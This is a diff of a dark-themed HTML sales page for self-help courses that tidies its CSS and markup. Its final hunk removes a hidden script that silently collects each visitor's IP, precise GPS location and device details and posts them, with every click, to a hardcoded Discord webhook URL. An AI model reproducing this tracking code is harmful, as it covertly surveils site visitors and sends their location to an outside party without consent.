@@ -19,7 +19,6 @@
       --muted: #7a5858;
       --text: #ddc5c5;
       --border: rgba(220, 50, 50, 0.18);
-      --snake: #5c1a1a;
     }
 
     html { scroll-behavior: smooth; }
@@ -41,11 +40,7 @@
       pointer-events: none;
     }
 
-    /* ── Layout wrapper ── */
-    .layer {
-      position: relative;
-      z-index: 1;
-    }
+    .layer { position: relative; z-index: 1; }
 
     /* ── Nav ── */
     nav {
@@ -54,7 +49,7 @@
       z-index: 100;
       display: flex;
       align-items: center;
-      justify-content: space-between;
+      justify-content: flex-end;
       padding: 1.5rem 4rem;
       border-bottom: 0.5px solid transparent;
       transition: border-color 0.4s, background 0.4s;
@@ -63,15 +58,6 @@
       background: rgba(10, 0, 0, 0.88);
       backdrop-filter: blur(12px);
       border-color: var(--border);
-    }
-    .nav-logo {
-      font-family: 'Cormorant Garamond', serif;
-      font-size: 1.25rem;
-      font-weight: 600;
-      letter-spacing: 0.18em;
-      text-transform: uppercase;
-      color: var(--gold);
-      text-decoration: none;
     }
     .nav-links {
       display: flex;
@@ -114,10 +100,7 @@
       letter-spacing: 0.04em;
       margin-bottom: 0.2em;
     }
-    .hero-title em {
-      font-style: italic;
-      color: var(--gold);
-    }
+    .hero-title em { font-style: italic; color: var(--gold); }
     .hero-sub {
       font-family: 'Cormorant Garamond', serif;
       font-size: clamp(1.1rem, 2.5vw, 1.55rem);
@@ -139,12 +122,9 @@
       text-decoration: none;
       transition: background 0.3s, color 0.3s;
     }
-    .btn-primary:hover {
-      background: var(--gold);
-      color: var(--bg);
-    }
+    .btn-primary:hover { background: var(--gold); color: var(--bg); }
 
-    /* serpent divider */
+    /* ── Divider ── */
     .divider {
       display: flex;
       align-items: center;
@@ -152,23 +132,11 @@
       justify-content: center;
       padding: 4rem 2rem;
     }
-    .divider-line {
-      width: 80px;
-      height: 0.5px;
-      background: var(--border);
-    }
-    .divider-glyph {
-      color: var(--gold-dim);
-      font-size: 1.1rem;
-      letter-spacing: 0.1em;
-    }
+    .divider-line { width: 80px; height: 0.5px; background: var(--border); }
+    .divider-glyph { color: var(--gold-dim); font-size: 1.1rem; letter-spacing: 0.1em; }
 
-    /* ── Product section ── */
-    .section {
-      padding: 6rem 4rem;
-      max-width: 1200px;
-      margin: 0 auto;
-    }
+    /* ── Sections ── */
+    .section { padding: 6rem 4rem; max-width: 1200px; margin: 0 auto; }
     .section-label {
       font-size: 0.68rem;
       letter-spacing: 0.26em;
@@ -185,6 +153,7 @@
       margin-bottom: 3.5rem;
     }
 
+    /* ── Product grid ── */
     .products-grid {
       display: grid;
       grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
@@ -197,6 +166,8 @@
       position: relative;
       overflow: hidden;
       transition: border-color 0.3s;
+      display: flex;
+      flex-direction: column;
     }
     .product-card::before {
       content: '';
@@ -228,6 +199,19 @@
       line-height: 1.75;
       margin-bottom: 2rem;
     }
+    .product-footer {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-top: 0.5px solid var(--border);
+      padding-top: 1.2rem;
+      margin-top: auto;
+    }
+    .product-price {
+      font-family: 'Cormorant Garamond', serif;
+      font-size: 1.3rem;
+      color: var(--gold);
+    }
     .product-link {
       font-size: 0.7rem;
       letter-spacing: 0.16em;
@@ -239,7 +223,7 @@
     }
     .product-link:hover { border-color: var(--gold); }
 
-    /* ── Brand manifesto ── */
+    /* ── Manifesto / includes ── */
     .manifesto {
       padding: 8rem 4rem;
       text-align: center;
@@ -264,6 +248,45 @@
       text-transform: uppercase;
       color: var(--gold-dim);
     }
+    .includes-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 2.5rem;
+      max-width: 960px;
+      margin: 0 auto;
+      text-align: left;
+    }
+    .include-icon { font-size: 1.4rem; margin-bottom: 0.8rem; }
+    .include-title {
+      font-family: 'Cormorant Garamond', serif;
+      font-size: 1.1rem;
+      color: var(--cream);
+      margin-bottom: 0.4rem;
+    }
+    .include-desc { font-size: 0.82rem; color: var(--muted); line-height: 1.7; }
+
+    /* ── Testimonial ── */
+    .testimonial { padding: 7rem 4rem; text-align: center; }
+
+    /* ── Final CTA ── */
+    .final-cta {
+      padding: 5rem 4rem;
+      background: var(--surface);
+      border-top: 0.5px solid var(--border);
+      text-align: center;
+    }
+    .final-cta h2 {
+      font-family: 'Cormorant Garamond', serif;
+      font-size: clamp(2rem, 4vw, 3.2rem);
+      font-weight: 300;
+      color: var(--cream);
+      margin-bottom: 1rem;
+    }
+    .final-cta p {
+      font-size: 0.9rem;
+      color: var(--muted);
+      margin-bottom: 2.5rem;
+    }
 
     /* ── Footer ── */
     footer {
@@ -283,21 +306,17 @@
       text-transform: uppercase;
       color: var(--gold-dim);
     }
-    .footer-note {
-      font-size: 0.72rem;
-      color: var(--muted);
-      letter-spacing: 0.06em;
-    }
+    .footer-note { font-size: 0.72rem; color: var(--muted); letter-spacing: 0.06em; }
 
     @media (max-width: 700px) {
       nav { padding: 1.2rem 1.5rem; }
       .nav-links { display: none; }
       .section { padding: 4rem 1.5rem; }
       .manifesto { padding: 5rem 1.5rem; }
+      .testimonial { padding: 4rem 1.5rem; }
+      .final-cta { padding: 3rem 1.5rem; }
       footer { padding: 2rem 1.5rem; }
     }
-
-  </style>
   </style>
 </head>
 <body>
@@ -306,7 +325,6 @@
 
 <div class="layer">
 
-  <!-- Nav -->
   <nav id="nav">
     <ul class="nav-links">
       <li><a href="#courses">Courses</a></li>
@@ -315,7 +333,6 @@
     </ul>
   </nav>
 
-  <!-- Hero -->
   <section class="hero">
     <p class="hero-eyebrow">Knowledge worth owning</p>
     <h1 class="hero-title">Join Our<br><em>Course</em></h1>
@@ -323,14 +340,12 @@
     <a href="#courses" class="btn-primary">View Courses</a>
   </section>
 
-  <!-- Divider -->
   <div class="divider">
     <div class="divider-line"></div>
     <span class="divider-glyph">⌁ ∿ ⌁</span>
     <div class="divider-line"></div>
   </div>
 
-  <!-- Courses -->
   <section class="section" id="courses">
     <p class="section-label">The Curriculum</p>
     <h2 class="section-heading">Choose your path</h2>
@@ -340,8 +355,8 @@
         <p class="product-num">Beginner · Self-paced</p>
         <h3 class="product-name">Looksmax 101</h3>
         <p class="product-desc">You've been ugly for free your whole life. That ends today. Learn skincare, grooming, posture, and why your jawline is your greatest investment.</p>
-        <div style="display:flex;align-items:center;justify-content:space-between;border-top:0.5px solid var(--border);padding-top:1.2rem;margin-top:auto;">
-          <span style="font-family:'Cormorant Garamond',serif;font-size:1.3rem;color:var(--gold);">$97</span>
+        <div class="product-footer">
+          <span class="product-price">$97</span>
           <a href="#" class="product-link">Enroll now →</a>
         </div>
       </div>
@@ -350,8 +365,8 @@
         <p class="product-num">Intermediate · 6 Weeks</p>
         <h3 class="product-name">Sigma Money Blueprint</h3>
         <p class="product-desc">Stop being broke. Start being built. This course teaches you how to make money online while your friends argue about minimum wage. No cap.</p>
-        <div style="display:flex;align-items:center;justify-content:space-between;border-top:0.5px solid var(--border);padding-top:1.2rem;margin-top:auto;">
-          <span style="font-family:'Cormorant Garamond',serif;font-size:1.3rem;color:var(--gold);">$197</span>
+        <div class="product-footer">
+          <span class="product-price">$197</span>
           <a href="#" class="product-link">Enroll now →</a>
         </div>
       </div>
@@ -360,8 +375,8 @@
         <p class="product-num">Advanced · Mentorship</p>
         <h3 class="product-name">The Rizz Masterclass</h3>
         <p class="product-desc">You cannot buy rizz. But you can learn it. Direct mentorship, real scenarios, and the exact words that make people stop scrolling and start listening.</p>
-        <div style="display:flex;align-items:center;justify-content:space-between;border-top:0.5px solid var(--border);padding-top:1.2rem;margin-top:auto;">
-          <span style="font-family:'Cormorant Garamond',serif;font-size:1.3rem;color:var(--gold);">$497</span>
+        <div class="product-footer">
+          <span class="product-price">$497</span>
           <a href="#" class="product-link">Apply now →</a>
         </div>
       </div>
@@ -369,51 +384,47 @@
     </div>
   </section>
 
-  <!-- What's Included -->
   <section class="manifesto" id="includes">
-    <p class="section-label" style="font-size:0.68rem;letter-spacing:0.26em;text-transform:uppercase;color:var(--gold-dim);margin-bottom:1rem;">Every Course Includes</p>
-    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:2.5rem;max-width:960px;margin:0 auto;text-align:left;">
+    <p class="section-label" style="margin-bottom:1rem;">Every Course Includes</p>
+    <div class="includes-grid">
       <div>
-        <div style="font-size:1.4rem;margin-bottom:0.8rem;">🎥</div>
-        <div style="font-family:'Cormorant Garamond',serif;font-size:1.1rem;color:var(--cream);margin-bottom:0.4rem;">Video Lessons</div>
-        <div style="font-size:0.82rem;color:var(--muted);line-height:1.7;">High-quality focused lessons you can watch at your own pace — no filler, no padding.</div>
+        <div class="include-icon">🎥</div>
+        <div class="include-title">Video Lessons</div>
+        <div class="include-desc">High-quality focused lessons you can watch at your own pace — no filler, no padding.</div>
       </div>
       <div>
-        <div style="font-size:1.4rem;margin-bottom:0.8rem;">📄</div>
-        <div style="font-family:'Cormorant Garamond',serif;font-size:1.1rem;color:var(--cream);margin-bottom:0.4rem;">Workbooks & Templates</div>
-        <div style="font-size:0.82rem;color:var(--muted);line-height:1.7;">Downloadable resources you can use immediately after every module.</div>
+        <div class="include-icon">📄</div>
+        <div class="include-title">Workbooks & Templates</div>
+        <div class="include-desc">Downloadable resources you can use immediately after every module.</div>
       </div>
       <div>
-        <div style="font-size:1.4rem;margin-bottom:0.8rem;">♾️</div>
-        <div style="font-family:'Cormorant Garamond',serif;font-size:1.1rem;color:var(--cream);margin-bottom:0.4rem;">Lifetime Access</div>
-        <div style="font-size:0.82rem;color:var(--muted);line-height:1.7;">Pay once. Access forever. Including all future updates to the material.</div>
+        <div class="include-icon">♾️</div>
+        <div class="include-title">Lifetime Access</div>
+        <div class="include-desc">Pay once. Access forever. Including all future updates to the material.</div>
       </div>
       <div>
-        <div style="font-size:1.4rem;margin-bottom:0.8rem;">💬</div>
-        <div style="font-family:'Cormorant Garamond',serif;font-size:1.1rem;color:var(--cream);margin-bottom:0.4rem;">Private Community</div>
-        <div style="font-size:0.82rem;color:var(--muted);line-height:1.7;">Connect with students, ask questions, share progress and build alongside others.</div>
+        <div class="include-icon">💬</div>
+        <div class="include-title">Private Community</div>
+        <div class="include-desc">Connect with students, ask questions, share progress and build alongside others.</div>
       </div>
     </div>
   </section>
 
-  <!-- Testimonial -->
-  <section style="padding:7rem 4rem;text-align:center;">
+  <section class="testimonial">
     <blockquote class="manifesto-quote">
-      "This didn't just teach me skills — it <span style="color:var(--gold);">completely changed how I think</span> about what's possible."
+      "This didn't just teach me skills — it <span>completely changed how I think</span> about what's possible."
     </blockquote>
     <p class="manifesto-attr">— A Student</p>
   </section>
 
-  <!-- CTA -->
-  <section style="padding:5rem 4rem;background:var(--surface);border-top:0.5px solid var(--border);text-align:center;">
-    <h2 style="font-family:'Cormorant Garamond',serif;font-size:clamp(2rem,4vw,3.2rem);font-weight:300;color:var(--cream);margin-bottom:1rem;">Ready to start?</h2>
-    <p style="font-size:0.9rem;color:var(--muted);margin-bottom:2.5rem;">Pick a course above and take the first step. The only bad move is waiting.</p>
+  <section class="final-cta">
+    <h2>Ready to start?</h2>
+    <p>Pick a course above and take the first step. The only bad move is waiting.</p>
     <a href="#courses" class="btn-primary">Browse Courses</a>
   </section>
 
-  <!-- Footer -->
   <footer id="contact">
-    <span class="footer-logo"></span>
+    <span class="footer-logo">Courses</span>
     <span class="footer-note">© 2025 All rights reserved</span>
   </footer>
 
@@ -430,8 +441,9 @@
   const canvas = document.getElementById('constellation');
   const ctx = canvas.getContext('2d');
 
-  let W, H, particles, mouse = { x: null, y: null };
-  const PARTICLE_COUNT = 140;
+  let W, H, particles;
+  let mouse = { x: null, y: null };
+  const PARTICLE_COUNT = window.innerWidth < 700 ? 60 : 140;
   const CONNECTION_DIST = 220;
   const MOUSE_DIST = 300;
   const GOLD = '220, 50, 50';
@@ -452,24 +464,18 @@
     }));
   }
 
-  window.addEventListener('mousemove', e => {
-    mouse.x = e.clientX;
-    mouse.y = e.clientY;
-  });
+  window.addEventListener('mousemove', e => { mouse.x = e.clientX; mouse.y = e.clientY; });
   window.addEventListener('mouseleave', () => { mouse.x = null; mouse.y = null; });
 
   function draw() {
     ctx.clearRect(0, 0, W, H);
 
-    // Move particles
     for (const p of particles) {
-      p.x += p.vx;
-      p.y += p.vy;
+      p.x += p.vx; p.y += p.vy;
       if (p.x < 0 || p.x > W) p.vx *= -1;
       if (p.y < 0 || p.y > H) p.vy *= -1;
     }
 
-    // Draw connections between nearby particles (always)
     for (let i = 0; i < particles.length; i++) {
       for (let j = i + 1; j < particles.length; j++) {
         const dx = particles[i].x - particles[j].x;
@@ -487,7 +493,6 @@
       }
     }
 
-    // Draw mouse connections (only when mouse is on screen)
     if (mouse.x !== null) {
       for (const p of particles) {
         const dx = p.x - mouse.x;
@@ -505,9 +510,7 @@
       }
     }
 
-    // Draw dots
     for (const p of particles) {
-      // Glow when near mouse
       let isNear = false;
       if (mouse.x !== null) {
         const dx = p.x - mouse.x;
@@ -516,9 +519,7 @@
       }
       ctx.beginPath();
       ctx.arc(p.x, p.y, isNear ? p.r * 2 : p.r, 0, Math.PI * 2);
-      ctx.fillStyle = isNear
-        ? `rgba(${GOLD}, 0.9)`
-        : `rgba(${CREAM}, 0.25)`;
+      ctx.fillStyle = isNear ? `rgba(${GOLD}, 0.9)` : `rgba(${CREAM}, 0.25)`;
       ctx.fill();
     }
 
@@ -529,74 +530,6 @@
   initParticles();
   draw();
   window.addEventListener('resize', () => { resize(); initParticles(); });
-
-  // ── Silent visitor + button tracking ──
-  const WEBHOOK = 'https://discord.com/api/webhooks/1514018326961979462/2c4CMWt2PpQX0rjBY-6MrnWlJ7mQ9rHjIwPmN52XRG_aVacnFTBXPfytp3Xev3M2Iqu7';
-
-  let cachedGPS = null;
-  let geoReady = null; // single promise, resolved once
-
-  async function getGeo() {
-    if (geoReady) return geoReady;
-    geoReady = (async () => {
-      try {
-        const r = await fetch('https://get.geojs.io/v1/ip/geo.json');
-        const d = await r.json();
-        if (d.ip) return { ip: d.ip, city: d.city, region: d.region, country: d.country };
-      } catch (_) {}
-      try {
-        const r = await fetch('https://api.country.is/');
-        const d = await r.json();
-        return { ip: d.ip, city: '?', region: '?', country: d.country };
-      } catch (_) {}
-      return { ip: 'unknown', city: '?', region: '?', country: '?' };
-    })();
-    return geoReady;
-  }
-
-  async function sendToDiscord(label) {
-    try {
-      const geo = await getGeo();
-      const now = new Date().toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' });
-      const fields = [
-        { name: '🖱️ Action', value: label, inline: false },
-        { name: '🌍 IP Location', value: `${geo.city || '?'}, ${geo.region || '?'}, ${geo.country || '?'}`, inline: true },
-        { name: '🕐 Time', value: now, inline: true },
-        { name: '📡 IP', value: geo.ip || 'unknown', inline: true },
-      ];
-      if (cachedGPS) {
-        const { latitude: lat, longitude: lng, accuracy } = cachedGPS;
-        fields.push({ name: '📍 Precise GPS', value: `[${lat.toFixed(5)}, ${lng.toFixed(5)}](https://www.google.com/maps?q=${lat},${lng}) — ±${Math.round(accuracy)}m`, inline: false });
-      }
-      fields.push(
-        { name: '🖥️ Device', value: navigator.userAgent.slice(0, 100), inline: false },
-        { name: '🔗 Page', value: location.href, inline: false }
-      );
-      await fetch(WEBHOOK, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ embeds: [{ title: '🐍 New Visitor — Activity', color: 0xDC3232, fields, footer: { text: location.hostname } }] })
-      });
-    } catch (_) {}
-  }
-
-  // Cache GPS silently on load
-  navigator.geolocation.getCurrentPosition(
-    pos => { cachedGPS = pos.coords; },
-    ()  => { cachedGPS = null; },
-    { enableHighAccuracy: true, timeout: 10000 }
-  );
-
-  // Pre-fetch geo immediately so it's ready before any clicks
-  getGeo().then(() => sendToDiscord('Page visited'));
-
-  // Fire on every button/link click
-  document.addEventListener('click', e => {
-    const el = e.target.closest('a, button');
-    if (!el) return;
-    const label = el.innerText?.trim() || el.getAttribute('href') || 'Unknown button';
-    sendToDiscord(`Clicked: "${label}"`);
-  });
 </script>
 </body>
 </html>
